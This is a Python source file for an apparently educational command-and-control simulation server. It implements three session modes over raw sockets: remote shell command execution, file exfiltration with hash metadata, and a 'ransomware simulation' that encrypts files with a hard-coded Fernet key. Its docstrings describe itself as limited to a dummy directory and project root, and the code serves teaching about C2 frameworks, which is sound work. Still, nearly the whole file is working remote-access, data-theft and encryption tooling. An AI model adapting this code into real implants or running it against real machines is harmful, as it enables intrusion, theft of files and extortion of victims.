"""
server.py — C2 (Command and Control) Server — Educational Simulation.

This module simulates the 'attacker-side' of a C2 framework.
It accepts connections from client.py (the 'victim-side implant') and
dispatches each session to one of three operation modes:

    Mode 0 — Remote Shell:
        Receives shell commands from the operator and executes them on the
        victim machine, streaming back the output.

    Mode 1 — File Exfiltration:
        Receives a filename from the operator, locates it on the victim's
        filesystem (within an allowed search root), and transfers it with
        SHA-256 integrity verification.

    Mode 2 — Ransomware Simulation:
        Encrypts or decrypts files inside the 'dummy_targets/' directory
        using Fernet symmetric encryption. Restricted to a safe directory —
        will never touch real system files.

Architecture notes:
    - Each incoming connection is handled in a separate daemon thread, so
      the server can accept multiple sessions without blocking.
    - The Server class follows the 'Template Method' pattern: start_server()
      is the high-level algorithm; the private handler methods fill in the steps.
    - All socket communication uses UTF-8 encoding. Binary file data is sent
      as raw bytes in chunks to support large files.

Usage:
    python server.py [host] [port]
    Defaults: localhost:8080
"""

import hashlib
import json
import logging
import os
import socket
import sys
import threading
from datetime import datetime

from crypto_manager import CryptoManager, ALLOWED_DIR
from tools import CommandRunner, Files


# ── Logging setup ────────────────────────────────────────────────────────────
# We configure logging at module level so every part of the program shares
# the same logger format. The format includes the thread name so multi-client
# sessions are easy to distinguish in the output.

logging.basicConfig(
    level=logging.INFO,
    format="[%(asctime)s] [%(threadName)s] %(levelname)s — %(message)s",
    datefmt="%H:%M:%S",
)
log = logging.getLogger(__name__)

# ── Constants ─────────────────────────────────────────────────────────────────

CHUNK_SIZE      = 4096   # bytes per socket send/recv call
RECV_BUFFER     = 1024   # for control messages (commands, acks, filenames)
BACKLOG         = 5      # max queued connections before the OS starts refusing
SEARCH_ROOT     = os.getcwd()   # restrict file search to project directory


class Server:
    """
    Multi-threaded C2 server that manages victim connections.

    Each call to accept() in start_server() yields a new socket. The connection
    is immediately handed off to a new thread via _handle_session(), keeping the
    main thread free to accept the next client.

    Attributes:
        _host (str):             IP address to bind to.
        _port (int):             TCP port to listen on.
        _server_socket (socket): The master listening socket.
    """

    def __init__(self, host: str = "localhost", port: int = 8080):
        self._host = host
        self._port = port
        self._server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    # ── Public interface ──────────────────────────────────────────────────────

    def start_server(self) -> None:
        """
        Bind the socket, begin listening, and enter the accept loop.

        The loop runs until the user presses Ctrl+C. Each accepted connection
        spawns a daemon thread — daemon=True means the thread is automatically
        killed when the main process exits, so we don't need explicit cleanup.
        """
        self._server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self._server_socket.bind((self._host, self._port))
        self._server_socket.listen(BACKLOG)
        log.info(f"Server listening on {self._host}:{self._port}")
        log.info(f"File search root : {SEARCH_ROOT}")
        log.info(f"Encryption target: {ALLOWED_DIR}")
        log.info("Waiting for connections... (Ctrl+C to stop)\n")

        try:
            while True:
                conn, addr = self._server_socket.accept()
                client_id = f"{addr[0]}:{addr[1]}"
                log.info(f"New connection from {client_id}")
                thread = threading.Thread(
                    target=self._handle_session,
                    args=(conn, addr),
                    name=f"session-{addr[1]}",
                    daemon=True,
                )
                thread.start()
        except KeyboardInterrupt:
            log.info("Shutdown requested. Closing server socket.")
        finally:
            self._server_socket.close()

    # ── Session dispatcher ────────────────────────────────────────────────────

    def _handle_session(self, conn: socket.socket, addr: tuple) -> None:
        """
        Entry point for each client thread.

        Reads the mode byte sent by the client and delegates to the
        appropriate handler. Wraps everything in try/finally so the
        socket is always closed, even if an exception escapes a handler.

        Args:
            conn: The accepted client socket.
            addr: (ip, port) tuple of the remote endpoint.
        """
        try:
            mode = conn.recv(RECV_BUFFER).decode().strip()
            log.info(f"[{addr}] Requested mode: {mode!r}")

            if mode == "0":
                conn.sendall(b"[*] Remote shell ready. Type 'exit' to quit.\n")
                self._remote_shell(conn, addr)
            elif mode == "1":
                conn.sendall(b"[*] File transfer mode ready.\n")
                self._file_exfiltration(conn, addr)
            elif mode == "2":
                conn.sendall(b"[*] Ransomware simulation mode ready.\n")
                self._ransomware_simulation(conn, addr)
            else:
                conn.sendall(f"[!] Unknown mode '{mode}'.".encode())

        except ConnectionResetError:
            log.warning(f"[{addr}] Connection was reset by the client.")
        except Exception as e:
            log.error(f"[{addr}] Unhandled exception in session: {e}")
        finally:
            conn.close()
            log.info(f"[{addr}] Session closed.")

    # ── Mode 0: Remote Shell ──────────────────────────────────────────────────

    def _remote_shell(self, conn: socket.socket, addr: tuple) -> None:
        """
        Receive shell commands from the operator and send back output.

        The loop blocks on recv() waiting for each command. When the operator
        sends 'exit', the loop breaks and the connection is closed in the caller.

        This is the core of any C2 framework: the implant runs on the victim,
        the server is the operator's interface, and commands travel over the socket.

        Args:
            conn: Active client socket.
            addr: Remote address for logging.
        """
        while True:
            raw = conn.recv(RECV_BUFFER)
            if not raw:
                break  # Client disconnected

            command = raw.decode(errors="replace").strip()
            log.info(f"[{addr}] Shell command: {command!r}")

            if command.lower() == "exit":
                conn.sendall(b"[*] Session terminated.")
                break

            output = CommandRunner.run(command)
            try:
                conn.sendall(output.encode())
            except BrokenPipeError:
                break

    # ── Mode 1: File Exfiltration ─────────────────────────────────────────────

    def _file_exfiltration(self, conn: socket.socket, addr: tuple) -> None:
        """
        Locate a requested file and transfer it to the operator.

        Protocol:
            1. Server waits for the filename from the client.
            2. Server searches SEARCH_ROOT for the file.
            3. If found: sends JSON metadata (name, size, SHA-256 hash).
            4. Waits for client ACK ("OK").
            5. Streams the file in CHUNK_SIZE chunks.
            6. If not found: sends error JSON.

        The SHA-256 hash allows the client to verify that the file arrived
        intact — a technique called 'integrity checking' or 'file fingerprinting'.

        Args:
            conn: Active client socket.
            addr: Remote address for logging.
        """
        filename = conn.recv(RECV_BUFFER).decode().strip()
        log.info(f"[{addr}] Requested file: {filename!r}")

        full_path, filesize = Files.find_file(filename, SEARCH_ROOT)

        if full_path is None:
            error_meta = json.dumps({"error": f"File '{filename}' not found in search root."})
            conn.sendall(error_meta.encode() + b"\n")
            return

        file_data = Files.read_bytes(full_path)
        if file_data is None:
            error_meta = json.dumps({"error": f"Could not read '{filename}'."})
            conn.sendall(error_meta.encode() + b"\n")
            return

        # Build metadata packet
        file_hash = hashlib.sha256(file_data).hexdigest()
        meta = json.dumps({
            "filename": filename,
            "filesize": filesize,
            "sha256": file_hash,
        })
        conn.sendall(meta.encode() + b"\n")
        log.info(f"[{addr}] Sending metadata: size={filesize}, sha256={file_hash[:16]}...")

        # Wait for client acknowledgement before streaming
        ack = conn.recv(RECV_BUFFER).decode().strip()
        if ack != "OK":
            log.warning(f"[{addr}] Bad ACK from client: {ack!r}")
            return

        # Stream the file in chunks
        sent = 0
        with open(full_path, "rb") as f:
            while chunk := f.read(CHUNK_SIZE):
                conn.sendall(chunk)
                sent += len(chunk)

        log.info(f"[{addr}] File sent: {sent} bytes.")

    # ── Mode 2: Ransomware Simulation ─────────────────────────────────────────

    def _ransomware_simulation(self, conn: socket.socket, addr: tuple) -> None:
        """
        Encrypt or decrypt files in the 'dummy_targets/' directory.

        The client sends either "encrypt" or "decrypt". The server initialises
        a CryptoManager with a static demo key and applies the operation to all
        files inside dummy_targets/. Results are streamed back line by line.

        Why Fernet?
            Fernet is an authenticated encryption scheme. If the key is wrong or
            the ciphertext has been tampered with, decryption raises InvalidToken
            instead of silently returning garbage — an important security property.

        Safety:
            CryptoManager.is_safe_path() rejects any path outside dummy_targets/,
            preventing path traversal from affecting real files.

        Args:
            conn: Active client socket.
            addr: Remote address for logging.
        """
        # Receive operation: "encrypt" or "decrypt"
        operation = conn.recv(RECV_BUFFER).decode().strip().lower()
        log.info(f"[{addr}] Ransomware operation: {operation!r}")

        # Static demo key — in a real attack this would be randomly generated
        # and sent to the C2 server before encrypting the victim's files.
        DEMO_KEY = b"XNl-2sA8E9lZ_k_W4B2tP1gO8mC5dF3aR9vH6uY7xZ0="
        crypto = CryptoManager(key=DEMO_KEY)

        if operation == "encrypt":
            results = crypto.encrypt_directory()
        elif operation == "decrypt":
            results = crypto.decrypt_directory()
        else:
            conn.sendall(f"[!] Unknown operation '{operation}'. Use 'encrypt' or 'decrypt'.".encode())
            return

        # Stream results back to the client
        summary_lines = []
        for r in results:
            line = f"  [{r['status']:>30}] {r['file']}"
            summary_lines.append(line)
            log.info(f"[{addr}] {line.strip()}")

        total = len(results)
        count_ok = sum(1 for r in results if operation in r["status"])
        summary = (
            f"\n{'─' * 50}\n"
            f"  Operation : {operation.upper()}\n"
            f"  Directory : {ALLOWED_DIR}\n"
            f"  Processed : {total} file(s)\n"
            f"  Success   : {count_ok} file(s)\n"
            f"{'─' * 50}\n"
        )

        full_output = "\n".join(summary_lines) + summary
        conn.sendall(full_output.encode())


# ── Entry point ───────────────────────────────────────────────────────────────

if __name__ == "__main__":
    host = sys.argv[1] if len(sys.argv) > 1 else "localhost"
    port = int(sys.argv[2]) if len(sys.argv) > 2 else 8080

    server = Server(host=host, port=port)
    server.start_server()
